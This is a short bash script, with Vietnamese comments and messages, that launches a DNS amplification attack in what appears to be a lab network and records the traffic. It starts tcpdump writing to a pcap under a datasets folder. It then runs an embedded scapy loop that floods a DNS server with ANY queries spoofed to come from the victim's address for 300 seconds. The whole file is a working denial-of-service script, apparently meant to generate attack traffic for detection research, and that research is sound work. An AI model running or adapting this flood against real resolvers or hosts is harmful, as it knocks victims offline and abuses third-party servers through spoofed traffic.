#!/bin/bash
VICTIM=10.0.2.10
DNS=10.0.2.11
DURATION=300

echo "Bat dau DNS Amplification vao $VICTIM (thong qua $DNS) trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Da sua -i s2-eth99 thanh -i any
tcpdump -i any -w datasets/s05_dns_ampl.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

python3 - <<PY &
from scapy.all import IP, UDP, DNS, DNSQR, send
pkt = IP(src="$VICTIM", dst="$DNS")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype=255))
while True: send(pkt, verbose=0)
PY
SCAPY_PID=$!

sleep $DURATION
kill $TCPDUMP_PID $SCAPY_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong DNS Amplification!"